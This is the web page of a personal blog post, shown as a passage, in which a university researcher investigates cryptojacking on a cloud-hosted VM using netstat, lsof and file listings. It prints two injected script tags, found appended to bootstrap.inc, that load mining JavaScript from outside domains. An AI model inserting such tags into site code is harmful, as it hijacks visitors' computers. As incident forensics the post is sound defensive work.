<!DOCTYPE html>
<html lang="en" style="font-size: 105%">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  
  <meta name="author" content="">

  
  
  <meta name="description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">
  

  
  <link rel="apple-touch-icon" sizes="180x180" href="https://rajsimmanravi.github.io//images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://rajsimmanravi.github.io//images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://rajsimmanravi.github.io//images/favicon-16x16.png">

  
  
  <meta name="keywords" content='hugo latex theme blog texify texify2 texify3 michael neuper'>
  

  
  
  <link rel="stylesheet" href='/katex/katex.min.css'>
<script defer defer src='/katex/katex.min.js'></script>
<script defer src='/katex/contrib/auto-render.min.js'></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          throwOnError : false
        });
    });
</script>
  

  
  

  
  <meta property="og:url" content="https://rajsimmanravi.github.io/posts/crytojacking/cryptojacking-phishing-savi/">
  <meta property="og:site_name" content="R4J&#39;s Personal Site">
  <meta property="og:title" content="Uncovering Cryptojacking/Phishing At University of Toronto">
  <meta property="og:description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-06-06T17:50:51-05:00">
    <meta property="article:modified_time" content="2025-10-02T22:48:15-04:00">
    <meta property="article:tag" content="Technical">


  
  <link rel="canonical" href="https://rajsimmanravi.github.io/posts/crytojacking/cryptojacking-phishing-savi/">

  
  
  
  <meta itemprop="name" content="Uncovering Cryptojacking/Phishing At University of Toronto">
  <meta itemprop="description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">
  <meta itemprop="datePublished" content="2020-06-06T17:50:51-05:00">
  <meta itemprop="dateModified" content="2025-10-02T22:48:15-04:00">
  <meta itemprop="wordCount" content="2464">
  <meta itemprop="keywords" content="Technical">

  
  
  
    <link rel="stylesheet" href="/css/common.min.e562d763c6d0825495eb17de8b2c1d9800cf7c08db1c36accedf77a5fccfc4b9.css" integrity="sha256-5WLXY8bQglSV6xfeiywdmADPfAjbHDaszt93pfzPxLk=" crossorigin="anonymous">
  

  
  
    <link rel="stylesheet" href="/css/content.min.ba38eba94cb47fef9936258c42d11ff19fa9686a30b38e783773fe3f15eb44dc.css" integrity="sha256-ujjrqUy0f&#43;&#43;ZNiWMQtEf8Z&#43;paGows454N3P&#43;PxXrRNw=" crossorigin="anonymous">
  

  
  
  <title>Uncovering Cryptojacking/Phishing At University of Toronto - R4J&#39;s Personal Site</title>
  

  
  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Uncovering Cryptojacking/Phishing At University of Toronto">
  <meta name="twitter:description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">


  


  <link rel="stylesheet" href="/css/single.min.be779f459ad7e3aaf8afd0f80c6a61ca6c50993f5f18512532100ac6d93f0fa9.css" integrity="sha256-vnefRZrX46r4r9D4DGphymxQmT9fGFElMhAKxtk/D6k=" crossorigin="anonymous">


  <link rel="stylesheet" href="/css/single.min.78a121b7d7a160420f9daab0ea13add66c37b9c44f27bba07b27207e2b0975d2.css" integrity="sha256-eKEht9ehYEIPnaqw6hOt1mw3ucRPJ7ugeycgfisJddI=" crossorigin="anonymous">


</head>

<body>
  <div id="wrapper">
    


<header id="header">
  <h1>
    <a href="https://rajsimmanravi.github.io/">R4J</a>
    <button id="dark-mode-toggle" class="dark-mode-toggle" aria-label="Toggle theme">
        <svg width="2rem" height="2rem" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 496">
        <path fill="currentColor" d="M8,256C8,393,119,504,256,504S504,393,504,256,393,8,256,8,8,119,8,256ZM256,440V72a184,184,0,0,1,0,368Z" transform="translate(-8 -8)"/>
        </svg>
    </button>
  </h1>

  <nav>
    
    <span class="nav-bar-item">
      
      <a class="link" href="/page/about/">ðŸ‘‹ About</a>
    </span>
    
    <span class="nav-bar-item">
      
        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<path d="M17,11H16a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2Zm0,4H16a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2ZM11,9h6a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2ZM21,3H7A1,1,0,0,0,6,4V7H3A1,1,0,0,0,2,8V18a3,3,0,0,0,3,3H18a4,4,0,0,0,4-4V4A1,1,0,0,0,21,3ZM6,18a1,1,0,0,1-2,0V9H6Zm14-1a2,2,0,0,1-2,2H7.82A3,3,0,0,0,8,18V5H20Zm-9-4h1a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2Zm0,4h1a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2Z"/></svg>
</span>
      
      <a class="link" href="/posts/">Blog</a>
    </span>
    
    <span class="nav-bar-item">
      
        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" data-name="Layer 1">
<path d="M10.07031,20.50291a1.00008,1.00008,0,0,0-1.18115-.9834c-1.30908.24024-2.96191.27637-3.40137-.958a5.70754,5.70754,0,0,0-1.83691-2.415,1.20073,1.20073,0,0,1-.1665-.10938,1,1,0,0,0-.93067-.64551H2.54883a.99965.99965,0,0,0-1,.99512c-.00391.81543.811,1.33789,1.1416,1.51465a4.4408,4.4408,0,0,1,.92383,1.35937c.36426,1.02344,1.42285,2.57617,4.46582,2.376.001.03516.00195.06836.00244.09863l.00439.26758a1,1,0,0,0,2,0l-.00488-.31836C10.07715,21.4951,10.07031,21.22068,10.07031,20.50291Zm10.667-15.126c.03174-.125.063-.26367.09034-.41992a6.27792,6.27792,0,0,0-.40821-3.293,1.002,1.002,0,0,0-.61572-.58007c-.356-.12012-1.67041-.35645-4.18408,1.25a13.86918,13.86918,0,0,0-6.354,0C6.76221.751,5.45459.9658,5.10205,1.07908a.99744.99744,0,0,0-.63135.584,6.3003,6.3003,0,0,0-.40332,3.35644c.02442.12793.05078.2461.07813.35449A6.26928,6.26928,0,0,0,2.89014,9.20311a8.42168,8.42168,0,0,0,.04248.92187c.334,4.60254,3.334,5.98438,5.42431,6.459-.04345.125-.083.25878-.11816.40039a1.00023,1.00023,0,0,0,1.94238.47851,1.6784,1.6784,0,0,1,.46778-.87793.99947.99947,0,0,0-.5459-1.74512c-3.4541-.39453-4.95362-1.80175-5.1792-4.89843a6.61076,6.61076,0,0,1-.03369-.73828,4.25769,4.25769,0,0,1,.91943-2.71289,3.022,3.022,0,0,1,.1958-.23145.99988.99988,0,0,0,.188-1.02441,3.3876,3.3876,0,0,1-.15527-.55567A4.09356,4.09356,0,0,1,6.1167,3.06346a7.54263,7.54263,0,0,1,2.415,1.17968,1.00877,1.00877,0,0,0,.82764.13282,11.77716,11.77716,0,0,1,6.17285.001,1.00549,1.00549,0,0,0,.83056-.13769,7.572,7.572,0,0,1,2.40528-1.19043,4.03977,4.03977,0,0,1,.0874,1.57812,3.205,3.205,0,0,1-.16895.60743.9999.9999,0,0,0,.188,1.02441c.07715.08691.1543.18066.22363.26855A4.12186,4.12186,0,0,1,20,9.20311a7.03888,7.03888,0,0,1-.0376.77734c-.22021,3.05566-1.72558,4.46387-5.1958,4.85937a1,1,0,0,0-.54541,1.7461,1.63079,1.63079,0,0,1,.46631.9082,3.06079,3.06079,0,0,1,.09229.81934v2.334C14.77,21.2949,14.77,21.78025,14.77,22.00291a1,1,0,1,0,2,0c0-.2168,0-.69238.00977-1.33984V18.31346a4.8815,4.8815,0,0,0-.15479-1.31153,4.25638,4.25638,0,0,0-.11621-.416,6.51258,6.51258,0,0,0,5.44531-6.42383A8.69677,8.69677,0,0,0,22,9.20311,6.13062,6.13062,0,0,0,20.7373,5.37693Z"/></svg>
</span>
      
      <a class="link" href="https://github.com/rajsimmanravi">GitHub</a>
    </span>
    
    <span class="nav-bar-item">
      
        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<path d="M20.47,2H3.53A1.45,1.45,0,0,0,2.06,3.43V20.57A1.45,1.45,0,0,0,3.53,22H20.47a1.45,1.45,0,0,0,1.47-1.43V3.43A1.45,1.45,0,0,0,20.47,2ZM8.09,18.74h-3v-9h3ZM6.59,8.48h0a1.56,1.56,0,1,1,0-3.12,1.57,1.57,0,1,1,0,3.12ZM18.91,18.74h-3V13.91c0-1.21-.43-2-1.52-2A1.65,1.65,0,0,0,12.85,13a2,2,0,0,0-.1.73v5h-3s0-8.18,0-9h3V11A3,3,0,0,1,15.46,9.5c2,0,3.45,1.29,3.45,4.06Z"/></svg>
</span>
      
      <a class="link" href="https://linkedin.com/in/rajsimman">LinkedIn</a>
    </span>
    
    <span class="nav-bar-item">
      
      <a class="link" href="/page/archives/">Archives</a>
    </span>
    
  </nav>
</header>
<hr class="head-rule"></hr>
    
<main id="main" class="post">
  
  <div class="post-heading">
    <h1 class="post-title">Uncovering Cryptojacking/Phishing At University of Toronto</h1>
    <div class="publish-metadata">
      
      <svg width="0.75em" height="0.75em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3 9H21M7 3V5M17 3V5M6 13H8M6 17H8M11 13H13M11 17H13M16 13H18M16 17H18M6.2 21H17.8C18.9201 21 19.4802 21 19.908 20.782C20.2843 20.5903 20.5903 20.2843 20.782 19.908C21 19.4802 21 18.9201 21 17.8V8.2C21 7.07989 21 6.51984 20.782 6.09202C20.5903 5.71569 20.2843 5.40973 19.908 5.21799C19.4802 5 18.9201 5 17.8 5H6.2C5.0799 5 4.51984 5 4.09202 5.21799C3.71569 5.40973 3.40973 5.71569 3.21799 6.09202C3 6.51984 3 7.07989 3 8.2V17.8C3 18.9201 3 19.4802 3.21799 19.908C3.40973 20.2843 3.71569 20.5903 4.09202 20.782C4.51984 21 5.07989 21 6.2 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
      6 June 2020
      
      
        &nbsp;
        <span>
          <svg width="0.75em" height="0.75em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M15.4998 5.49994L18.3282 8.32837M3 20.9997L3.04745 20.6675C3.21536 19.4922 3.29932 18.9045 3.49029 18.3558C3.65975 17.8689 3.89124 17.4059 4.17906 16.9783C4.50341 16.4963 4.92319 16.0765 5.76274 15.237L17.4107 3.58896C18.1918 2.80791 19.4581 2.80791 20.2392 3.58896C21.0202 4.37001 21.0202 5.63634 20.2392 6.41739L8.37744 18.2791C7.61579 19.0408 7.23497 19.4216 6.8012 19.7244C6.41618 19.9932 6.00093 20.2159 5.56398 20.3879C5.07171 20.5817 4.54375 20.6882 3.48793 20.9012L3 20.9997Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          2464 words
        </span>
      
      
      
        
      
      
        &nbsp;
        <span>
          <svg width="0.75em" height="0.75em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 7V12L14.5 13.5M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          ~12 mins
        </span>
      
    </div>
  </div>

  
  <div>
    
    <a class="link tag" href='https://rajsimmanravi.github.io/tags/technical'>#technical</a>
    
    <br></br>
  </div>
  
  
  
  <details>
    <summary>
      <b>Table of Contents</b>
    </summary>
    <div class="toc numbered-subtitles"><nav id="TableOfContents">
  <ul>
    <li><a href="#network-analysis">Network Analysis</a></li>
    <li><a href="#applications-analysis">Applications Analysis</a></li>
    <li><a href="#phishing-attack">Phishing Attack</a>
      <ul>
        <li><a href="#mysql-database-analysis">MySQL Database Analysis</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a>
      <ul>
        <li><a href="#cleaning-up">Cleaning Up</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
  </details>
  
  
  <article class="content numbered-subtitles">
    
    <p>During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.</p>
<p>&#x26a1; <strong>Note that for privacy concerns, I removed the actual website domain and removed some parts of the public IP addresses.</strong></p>
<h2 id="network-analysis">Network Analysis</h2>
<p>I began my analysis by looking at the network connections on the virtual machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:~$ sudo netstat -an
</span></span><span style="display:flex;"><span>Active Internet connections (servers and established)
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:38252   204.188.217.xx:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:22      10.10.10.12:58172       ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:55387   204.188.217.xx:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp6       0      0 :::80                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::22                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::25                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::443                  :::*                    LISTEN
</span></span><span style="display:flex;"><span>udp        0      0 10.10.10.10:123     0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 127.0.0.1:123           0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:123             0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:59028           0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 127.0.0.1:18120         0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:1812            0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:1813            0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:1814            0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:51414           0.0.0.0:*
</span></span><span style="display:flex;"><span>udp6       0      0 fe80::219:b9ff:fe2c:123 :::*
</span></span><span style="display:flex;"><span>udp6       0      0 ::1:123                 :::*
</span></span><span style="display:flex;"><span>udp6       0      0 :::123                  :::*
</span></span></code></pre></div><p>Based on the <strong>netstat connections</strong>, I realized a few <strong><code>tcp</code></strong> connections were using the port <strong>80</strong>. So I took a peek on the processes using these connections:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:~$ sudo lsof -i tcp:80 -P -R
</span></span><span style="display:flex;"><span>COMMAND     PID  PPID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
</span></span><span style="display:flex;"><span>/usr/sbin 26545     1 www-data    3u  IPv4 22142705      0t0  TCP website.ca:55464-&gt;204.188.217.xx:80 (ESTABLISHED)
</span></span><span style="display:flex;"><span>/usr/sbin 26550     1 www-data    3u  IPv4 22105560      0t0  TCP website.ca:38252-&gt;204.188.217.xx:80 (ESTABLISHED)
</span></span><span style="display:flex;"><span>apache2   27805     1     root    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   27993 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28066 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28067 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28447 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28449 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29256 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29262 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29373 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29375 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29436 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span></code></pre></div><p>The connections to some IP address with port <strong>80</strong> looked interesting and so I took a deeper dive on the process <strong>26545</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:~$ sudo lsof -p 26545
</span></span><span style="display:flex;"><span>COMMAND     PID     USER   FD   TYPE             DEVICE SIZE/OFF     NODE NAME
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  cwd    DIR              252,0    69632  3538945 /tmp
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  rtd    DIR              252,0     4096        2 /
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  txt    REG              252,0    10416  3017043 /usr/bin/perl
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    43416  4981915 /usr/lib/perl/5.18.2/auto/Socket/Socket.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    18728  4981918 /usr/lib/perl/5.18.2/auto/IO/IO.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    43368  6946983 /lib/x86_64-linux-gnu/libcrypt-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0   141574  6947044 /lib/x86_64-linux-gnu/libpthread-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0  1071552  6946910 /lib/x86_64-linux-gnu/libm-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    14664  6946980 /lib/x86_64-linux-gnu/libdl-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0  1840928  6947193 /lib/x86_64-linux-gnu/libc-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0  1608280  3017046 /usr/lib/libperl.so.5.18.2
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0   149120  6947052 /lib/x86_64-linux-gnu/ld-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    0r   CHR                1,3      0t0     6368 /dev/null
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    1w  FIFO                0,8      0t0 22105555 pipe
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    2w   REG              252,0    14135 10751213 /var/log/apache2/error.log
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    3u  IPv4           22143052      0t0      TCP website.ca:55789-&gt;204.188.217.xx:http (ESTABLISHED)
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    6u  unix 0xffff88022e742c00      0t0 22105553 socket
</span></span></code></pre></div><p>There were <strong>perl</strong> scripts running and also the process was accessing <code>/var/log/apache2/error.log</code>. I noticed the IP address <code>204.188.217.xx</code> kept recurring and I knew it was related to the webserver. My next stop was to look at the application itself.</p>
<h2 id="applications-analysis">Applications Analysis</h2>
<p>I started checking the <code>/var/www</code> directory to check for any activity by the user <code>www-data</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www$ ls -la
</span></span><span style="display:flex;"><span>total 56
</span></span><span style="display:flex;"><span>drwxr-xr-x 13 root     root     4096 Sep 10 22:37 .
</span></span><span style="display:flex;"><span>drwxr-xr-x 13 root     root     4096 Feb 28  2017 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x  5 root     root     4096 Oct  3  2016 alg.old
</span></span><span style="display:flex;"><span>drwxr-xr-x  8 root     root     4096 Aug 23  2013 corporateclean
</span></span><span style="display:flex;"><span>drwxr-xr-x  2 root     root     4096 Jul 17  2012 demo
</span></span><span style="display:flex;"><span>drwxr-xr-x  2 root     root     4096 Feb  1  2017 html
</span></span><span style="display:flex;"><span>drwxr-xr-x 11 www-data www-data 4096 Sep  3 23:52 subdomain
</span></span><span style="display:flex;"><span>drwxr-xr-x  5 root     root     4096 Nov 29  2017 nal
</span></span><span style="display:flex;"><span>drwxr-xr-x  2 root     root     4096 Mar  3  2015 phpmyadmin
</span></span><span style="display:flex;"><span>drwxrwxr-x  6 www-data www-data 4096 Feb  5  2018 site
</span></span><span style="display:flex;"><span>drwxr-xr-x  8 root     root     4096 Feb 28  2017 site-wp-3.3
</span></span><span style="display:flex;"><span>drwxr-xr-x  6 stack    stack    4096 Feb 28  2017 site-wp-3.5
</span></span><span style="display:flex;"><span>drwxr-xr-x  6 stack    stack    4096 Feb 28  2017 site-wp-3.7
</span></span><span style="display:flex;"><span>-rw-r--r--  1 root     root       21 May  4  2012 test.php
</span></span></code></pre></div><p>There were two folders: <code>subdomain</code> and <code>site</code>. Since <code>subdomain</code> is the most recent updated folder, I delved onto the <code>includes/</code> subfolder:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www/subdomain$ ls -la --full-time includes/
</span></span><span style="display:flex;"><span>total 1804
</span></span><span style="display:flex;"><span>drwxr-xr-x  4 www-data www-data   4096 2017-05-25 21:38:11.742771907 -0400 .
</span></span><span style="display:flex;"><span>drwxr-xr-x 11 www-data www-data   4096 2018-09-03 23:52:29.924296116 -0400 ..
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  13816 2017-05-25 17:54:24.388035506 -0400 actions.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  46913 2017-05-25 17:54:24.388035506 -0400 ajax.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data   1701 2017-05-25 17:54:24.388035506 -0400 archiver.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  13664 2017-05-25 17:54:24.384035450 -0400 authorize.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  17497 2017-05-25 17:54:24.388035506 -0400 batch.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data   2310 2017-05-25 17:54:24.380035393 -0400 batch.queue.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  19998 2017-05-25 17:54:24.384035450 -0400 cache.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data   2487 2017-05-25 17:54:24.384035450 -0400 cache-install.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data 302278 2017-05-25 17:54:24.384035450 -0400 common.inc
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>There was one particulr line that looks very suspicious (because of the last updated timetstamp and the size was larger than the others):</p>
<p><code>-rw-r--r--  1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc</code></p>
<p>While sifting through the file I was able to find something interesting at the end:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>?&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//upgraderservices.cf/drupal.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;<span style="color:#75715e">&lt;?php^M
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//drupalupdates.tk/check.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>?php^M
</span></span></code></pre></div><p>This looked very suspicious because of the domains and so I researched this piece of code and found out these were cryptomining scripts, as reported by a twitter post: <a href="https://twitter.com/bad_packets/status/1037416308336287744">https://twitter.com/bad_packets/status/1037416308336287744</a></p>
<p>To remediate this issue, I simply removed these scripts. However, the connections still persisted:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www/subdomain$ netstat -an
</span></span><span style="display:flex;"><span>Active Internet connections (servers and established)
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:42191   98.137.157.43:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:47567   192.64.147.176:25       SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48204   23.20.239.12:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:46017   67.195.228.87:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48211   23.20.239.12:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:50025   98.136.101.116:25       TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:49812   52.162.126.195:25       SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:36409   185.53.178.8:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48231   23.20.239.12:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:43103   207.148.248.145:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:58587   162.255.119.180:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0    168 10.10.10.10:22      10.10.10.12:38580   ESTABLISHED
